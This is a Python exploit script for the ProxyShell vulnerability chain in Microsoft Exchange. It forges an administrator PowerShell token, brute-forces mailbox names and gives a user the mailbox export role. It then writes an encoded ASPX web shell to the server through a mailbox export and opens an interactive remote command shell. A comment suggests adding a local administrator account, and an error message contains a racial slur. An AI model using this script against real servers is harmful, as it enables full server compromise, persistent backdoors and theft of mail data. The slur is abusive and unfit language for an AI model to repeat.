#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial
import datetime
x = datetime.datetime.now()
print("date " + str(x))
class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""
def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))
def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))
r_port = rand_port()
subj_ = rand_string()
class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        powershell_url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers['content-length'])
        content_type = self.headers['content-type']
        post_data = self.rfile.read(length).decode()
        post_data = re.sub('<wsa:To>(.*?)</wsa:To>', '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub('<wsman:ResourceURI s:mustUnderstand="true">(.*?)</wsman:ResourceURI>', '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>', post_data)

        headers = {
            'Content-Type': content_type
        }

        r = self.proxyshell.post(
            powershell_url,
            post_data,
            headers
        )

        resp = r.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(resp)
    def log_message(self, format, *args):
            return
class ProxyShell:

    def __init__(self, exchange_url, email, verify=False):

        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.rand_email = f'{rand_string()}@{rand_string()}.{rand_string(3)}'
        self.admin_sid = None
        self.legacydn = None
        self.rand_subj = rand_string(16)
        self.session = requests.Session()
        self.session.verify = verify

    def post(self, endpoint, data, headers={}):
        path = ''
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f'{self.exchange_url}{path}'
        r = self.session.post(
            url=url,
            data=data,
            headers=headers
        )
        return r
    def get_token(self):
        self.token = self.gen_token()
        t = requests.get(
            self.exchange_url+'/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp'.format(endpoint="/powershell/?X-Rps-CAT="+self.token),
            headers={"Cookie": "PrivateComputer=true; ClientID=C715155F2BE844E0-BD342960067874C8; X-OWA-JS-PSD=1"},
            verify=False
            )
        if t.status_code == 200:
            return self.token
        else:
            print("bad powershell_token "+ str(t) + " but let try...")
            return self.token
    def get_sid(self):

        data = self.legacydn
        data += '\x00\x00\x00\x00\x00\xe4\x04'
        data += '\x00\x00\x09\x04\x00\x00\x09'
        data += '\x04\x00\x00\x00\x00\x00\x00'

        headers = {
            "X-Requesttype": 'Connect',
            "X-Clientinfo": '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            "X-Clientapplication": 'Outlook/15.0.4815.1002',
            "X-Requestid": '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http'
        }

        r = self.post(
            '/mapi/emsmdb',
            data,
            headers
        )

        self.sid = r.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
        self.admin_sid = ''
        if self.sid.rsplit("-",1)[1] != '500':
            self.admin_sid = self.sid.rsplit("-",1)[0] + '-500'
        else:
            self.admin_sid = self.sid
    def get_legacydn(self):

        data = self.autodiscover_body()
        headers = {'Content-Type': 'text/xml'}
        r = self.post(
            '/autodiscover/autodiscover.xml',
            data,
            headers
        )

        autodiscover_xml = r.text
        self.legacydn = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', autodiscover_xml)[0]

    def autodiscover_body(self):

        autodiscover = ET.Element(
            'Autodiscover',
            xmlns='http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006'
        )

        request = ET.SubElement(autodiscover, 'Request')
        ET.SubElement(request, 'EMailAddress').text = self.email
        ET.SubElement(request, 'AcceptableResponseSchema').text = 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a'

        return ET.tostring(
            autodiscover,
            encoding='unicode',
            method='xml',
            xml_declaration=False
        )
    def set_ews(self):
        mail = self.email
        sid = self.admin_sid
        payload = 'ldZUhrdpFDnNqQbf96nf2v+CYWdUhrdpFII5hvcGqRT/gtbahqXahoLZnl33BlQUt9MGObmp39opINOpDYzJ6Z45OTk52qWpzYy+2lz32tYUfoLaddpUKVTTDdqCD2uC9wbWqV3agskxvtrWadMG1trzRAYNMZ45OTk5IZ6V+9ZUhrdpFNk='
        send_email = f'''
        <soap:Envelope
          xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
          xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
          xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Header>
            <t:RequestServerVersion Version="Exchange2016" />
            <t:SerializedSecurityContext>
              <t:UserSid>{sid}</t:UserSid>
              <t:GroupSids>
                <t:GroupIdentifier>
                  <t:SecurityIdentifier>S-1-5-21</t:SecurityIdentifier>
                </t:GroupIdentifier>
              </t:GroupSids>
            </t:SerializedSecurityContext>
          </soap:Header>
          <soap:Body>
            <m:CreateItem MessageDisposition="SaveOnly">
              <m:Items>
                <t:Message>
                  <t:Subject>{subj_}</t:Subject>
                  <t:Body BodyType="HTML">hello darkness my old friend</t:Body>
                  <t:Attachments>
                    <t:FileAttachment>
                      <t:Name>FileAttachment.txt</t:Name>
                      <t:IsInline>false</t:IsInline>
                      <t:IsContactPhoto>false</t:IsContactPhoto>
                      <t:Content>{payload}</t:Content>
                    </t:FileAttachment>
                  </t:Attachments>
                  <t:ToRecipients>
                    <t:Mailbox>
                      <t:EmailAddress>{mail}</t:EmailAddress>
                    </t:Mailbox>
                  </t:ToRecipients>
                </t:Message>
              </m:Items>
            </m:CreateItem>
          </soap:Body>
        </soap:Envelope>
        '''
        for i in range(0, 3):
            p = self.post(
                '/ews/exchange.asmx',
                data=send_email,
                headers={"Content-Type":"text/xml"}
                )
            return p
    def gen_token(self):

        # From: https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/
        version = 0
        ttype = 'Windows'
        compressed = 0
        auth_type = 'Kerberos'
        raw_token = b''
        gsid = 'S-1-5-32-544'

        version_data = b'V' + (1).to_bytes(1, 'little') + (version).to_bytes(1, 'little')
        type_data = b'T' + (len(ttype)).to_bytes(1, 'little') + ttype.encode()
        compress_data = b'C' + (compressed).to_bytes(1, 'little')
        auth_data = b'A' + (len(auth_type)).to_bytes(1, 'little') + auth_type.encode()
        login_data = b'L' + (len(self.email)).to_bytes(1, 'little') + self.email.encode()
        user_data = b'U' + (len(self.admin_sid)).to_bytes(1, 'little') + self.admin_sid.encode()
        group_data = b'G' + struct.pack('<II', 1, 7) + (len(gsid)).to_bytes(1, 'little') + gsid.encode()
        ext_data = b'E' + struct.pack('>I', 0)

        raw_token += version_data
        raw_token += type_data
        raw_token += compress_data
        raw_token += auth_data
        raw_token += login_data
        raw_token += user_data
        raw_token += group_data
        raw_token += ext_data

        data = base64.b64encode(raw_token).decode()

        return data

def exploit(proxyshell):
    proxyshell.get_legacydn()
    print(f'legacyDN {proxyshell.legacydn}')

    proxyshell.get_sid()
    print(f'leak_sid {proxyshell.sid}')
    print(f'admin_sid {proxyshell.admin_sid}')
    proxyshell.get_token()
    print(f'powershell_token {proxyshell.token}')

    print('set_ews ' + str(proxyshell.set_ews()))

def start_server(proxyshell, port):

    handler = partial(PwnServer, proxyshell)
    server = ThreadedHTTPServer(('', port), handler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def shell(command, port):
    if command.lower() in ['exit', 'quit']:
        exit(0)
    wsman = WSMan("127.0.0.1", username='', password='', ssl=False, port=port, auth='basic', encryption='never')
    with RunspacePool(wsman) as pool:
        ps = PowerShell(pool)
        ps.add_script(command)
        output = ps.invoke()

def get_fqdn(exchange_url):
    e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
    r = requests.get(exchange_url + e, verify=False, timeout=5)
    try:
        fqdn = r.headers["X-CalculatedBETarget"]
        return fqdn
    except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
        print(f"(-) {exchange_url}")
        exit(0)
    except Exception:
        exit(0)   
def check_mail(exchange_url, fqdn, files):
    email = ''
    domain = fqdn.split('.',1)[1]
    for l in open(files).read().splitlines():
        e = "/autodiscover/autodiscover.json?@evil.corp/autodiscover/autodiscover.xml?&Email=autodiscover/autodiscover.json%3F@evil.corp" 
        c_mail = l+"@"+domain 
        autodiscover_payload = '''<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>{mail}</EMailAddress>
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
        '''.format(mail=c_mail)
        autodiscover_req = requests.post(f"{exchange_url}{e}", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)", "Content-Type": "text/xml"},data=autodiscover_payload, verify=False)
        if "<ErrorCode>50" in autodiscover_req.text:
            print("bad " +c_mail)
            pass
        elif "<ErrorCode>" not in autodiscover_req.text:
            email = c_mail
            #print(autodiscover_req.text)
            if autodiscover_req.text == "":
                print("(-) " +exchange_url)
                exit()
            else:
                print("found " + email)
                return email
        else:
            mess = autodiscover_req.text.split("<Message>")[1].split('</Message>')[0]
            print("(-) " + c_mail + f" {mess}")
    return email
def escape(_str):
    _str = _str.replace("'", "\\'")
    _str = _str.replace('"', '\\"')
    return _str
def exec_cmd(shell_url, code="exec_code"):
    try:
        whoami = f'Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami").StdOut.ReadAll());'
        print('whoami ', end='', flush=True)
        req_test = requests.get(shell_url, params={"exec_code":whoami}, verify=False, timeout=5)
        if req_test.status_code == 200:
            print(req_test.text.split('!BD')[0].split('\n')[0])
            while True:
                cmd = input("SHELL> ")
                if cmd.lower() == 'exit':
                	exit(0)
                shell_body_exec = '%s=Response.Write(new ActiveXObject("WScript.Shell").exec("%s").stdout.readall());'%(code, escape(cmd))
                shell_req = requests.post(shell_url, headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False, timeout=20)
                if shell_req.status_code == 200:
                    print(shell_req.text.split('!BD')[0])
                elif shell_req.status_code == 500:
                    print('av block exec command or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
                else:
                    print('shell', shell_req)
        else:
            print('shell', req_test)
    except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
        print("target timeout")
        exit(0)
    except KeyboardInterrupt:
        exit(0)
def get_args():

    parser = argparse.ArgumentParser(description='ProxyShell example')
    parser.add_argument('-t', help='Exchange URL', required=True)
    parser.add_argument('-l', help='List user for brute force email', default='user.txt')
    parser.add_argument('-e', help='Email address', default='administrator@domain.local')
    return parser.parse_args()

def main():
    args = get_args()
    exchange_url = "https://" + args.t
    fqdn = get_fqdn(exchange_url)
    print("fqdn " + fqdn)
    #print("date " + x)
    email = ''
    if "administrator@domain.local" not in args.e:
        email = args.e
        print("use " + email)
    elif args.l:
        files = args.l
        email = check_mail(exchange_url, fqdn, files)
    elif args.e and args.l or args.l and args.e:
        print("stop stupid nigga")
        exit(0)
    else:
        print("stop stupid nigga")
        exit(0)
    #well i'm not good for set args ...
    local_port = int(r_port)
    uname = email.split('@')[0]
    proxyshell = ProxyShell(
        exchange_url,
        email
    )
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    file_name = rand_string() + '.aspx'
    path = "/aspnet_client/"
    shell_path = f"\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\{file_name}"
    #path = "/owa/auth/"
    #shell_path = f"\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\"+file_name
    print("set role import/export to user " + email.split('@')[0])
    shell(f'New-ManagementRoleAssignment -Role "Mailbox Import Export" -User "{uname}"', local_port)
    print("clear all mailboxexport record")
    shell('Get-MailboxExportRequest -Status Completed | Remove-MailboxExportRequest -Confirm:$false', local_port)
    print("write shell " + file_name)
    shell(f'New-MailboxExportRequest -Mailbox {email} -IncludeFolders ("#Drafts#") -ContentFilter "(Subject -eq \'{subj_}\')" -ExcludeDumpster -FilePath "{shell_path}"', local_port)
    time.sleep(5)
    shell_url = f"{exchange_url}{path}{file_name}"
    print(f"path shell at {shell_url}")
    for i in range(0, 10):
        f = requests.get(f"{shell_url}", verify=False)
        if f.status_code == 200:
            print(f"got shell {f}")
            exec_cmd(shell_url)
        else:
            print('got shell ' + str(f))
        time.sleep(5)
    while True:
        ps = input("PS> ")
        shell(ps, local_port)
if __name__ == '__main__':
    try:
        requests.packages.urllib3.disable_warnings(
            requests.packages.urllib3.exceptions.InsecureRequestWarning
        )
        main()
    except KeyboardInterrupt:
        exit(0)
